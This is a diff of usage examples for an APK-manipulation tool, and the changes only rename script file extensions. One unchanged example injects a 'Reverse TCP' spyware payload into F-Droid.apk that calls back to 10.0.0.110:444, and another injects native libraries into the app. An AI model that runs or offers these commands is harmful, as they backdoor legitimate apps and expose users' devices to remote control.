@@ -1,10 +1,10 @@
 $apac --in='F-Droid.apk,GCamBrasil.apk' --mode-by-name=DECODE --casper3-options='res=yes, dex=no'
 
-$apac --in='F-Droid.apk, LineageOS-2020-miatoll.zip' --select-by-name=Lineage --script=extract.dsc --output-dir=%CONF_OUTPUT_DIR
+$apac --in='F-Droid.apk, LineageOS-2020-miatoll.zip' --select-by-name=Lineage --script=extract.asc --output-dir=%CONF_OUTPUT_DIR
 
-$apac --in=F-Droid.apk --structure-model=APKTOOL --script=decode.dsc --output=fdroid --max-thread=6 --max-host-memory=2Mb
+$apac --in=F-Droid.apk --structure-model=APKTOOL --script=decode.asc --output=fdroid --max-thread=6 --max-host-memory=2Mb
 
-$apac --if=F-Droid.apk --structure-model=APKTOOL --script=decode.dsc --output-in-memory --max-thread=6 --max-host-memory=22Mb --perform-operation='%copy% some_file.txt $output:lib/$arch:armv8a/'
+$apac --if=F-Droid.apk --structure-model=APKTOOL --script=decode.asc --output-in-memory --max-thread=6 --max-host-memory=22Mb --perform-operation='%copy% some_file.txt $output:lib/$arch:armv8a/'
 
 $apac --in=F-Droid.apk -m 2 --use-techniques=AdvancedSpyware --aspy-type='Reverse TCP' --aspy-options='LPORT=444; LHOST=10.0.0.110' --display-file-info --display-api-name --display-package-name --display-required-permissions
 
@@ -14,7 +14,7 @@ $apac --in=F-Droid.apk --package-aliasing --execute='echo "Everything is ok!"'
 
 $apac --display-required-permissions --daemon F-Droid.apk
 
-$apac --script=extract.ds --execute='echo "F-Droid has been extracted!"' --progress-mode=elaborate F-Droid.apk
+$apac --script=extract.asc --execute='echo "F-Droid has been extracted!"' --progress-mode=elaborate F-Droid.apk
 
 $apac --use-techniques=PluginInjector --in-list='[libdroid.so, libmake.so, libsomething.so]' --in F-Droid.apk --target-arch=aarm64
 
